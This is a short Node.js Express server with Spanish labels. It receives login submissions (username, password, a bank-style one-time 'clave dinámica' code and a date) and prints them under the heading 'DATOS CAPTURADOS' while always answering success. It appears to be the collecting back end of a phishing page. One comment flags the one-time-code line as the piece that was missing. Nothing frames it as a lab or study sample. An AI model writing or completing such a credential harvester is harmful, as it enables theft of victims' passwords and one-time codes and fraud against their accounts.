const express = require('express');
const cors = require('cors');

const app = express();
const port = 3000;

app.use(cors());
app.use(express.json());

app.post('/api/login', (req, res) => {
  const { usuario, clave, claveDinamica, fecha } = req.body;
  
  console.log('----------------------------');
  console.log('🔴 DATOS CAPTURADOS:');
  console.log('Usuario:', usuario || '');
  console.log('Clave:', clave || '');
  console.log('Clave dinámica:', claveDinamica || '');  // <-- ESTA LÍNEA ES LA QUE FALTA
  console.log('Fecha:', fecha || new Date().toLocaleString());
  console.log('----------------------------');
  
  res.json({ ok: true });
});

app.listen(port, () => {
  console.log(`Servidor corriendo en http://localhost:${port}`);
});